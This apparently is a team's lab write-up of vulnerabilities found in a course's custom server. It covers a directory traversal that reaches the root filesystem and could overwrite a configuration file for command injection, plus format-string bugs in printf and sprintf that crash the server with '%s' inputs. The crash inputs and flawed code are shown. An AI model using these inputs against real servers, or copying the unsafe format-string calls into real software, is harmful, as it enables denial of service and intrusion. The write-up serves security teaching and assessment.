## Team 2

### Directory Traversal

* We can directly cd into root directory.

```
cd $/
Message: Working directory changed!

ls
total 96
drwxr-xr-x   2 root root  12288 Mar 13 05:08 bin
drwxr-xr-x   4 root root   4096 Mar  6 05:10 boot
drwxr-xr-x  21 root root   4500 Mar 15 08:50 dev
drwxr-xr-x 136 root root  12288 Mar 20 05:10 etc
drwxr-xr-x   2 root root   4096 Apr 12  2016 home
drwxr-xr-x   2 root root      0 Mar 26 18:14 homes
lrwxrwxrwx   1 root root     32 Aug 31  2017 initrd.img -> boot/initrd.img-4.4.0-62-generic
drwxr-xr-x  18 root root   4096 Feb 22 10:53 lib
drwxr-xr-x   2 root root   4096 Jan 23 05:09 lib64
drwx------   2 root root  16384 Aug 31  2017 lost+found
drwxr-xr-x   3 root root   4096 Aug 31  2017 media
...
```
* This can be used to overwrite the configuration file and thus allows for command injection when the server restarts.

### Format string

* All commands sent by the user are printed first. So we can crash the server by sending a bunch of %s. 
```C
n = read(sock_id_new,internal,sizeof(internal));
printf(internal);
```
```
Client:

%s%s%s%s%s%s%s%s
Error: read failed!
mc02 63 $

Server:

mc02 73 $ ./server 
Segmentation fault (core dumped)
mc02 74 $
```

* The server when starting up, takes a few arguments which are not used. But these arguments are copied using an snprintf command.
```C
char givenArgs[10];
for(int i=1; i<argc; i++)
{
  if(strlen(argv[i]) < 10) 
  {
    sprintf(givenArgs,argv[i]);					
  }
      
      
mc02 75 $ ./server %s%s%s%s
Segmentation fault (core dumped)
mc02 76 $
```
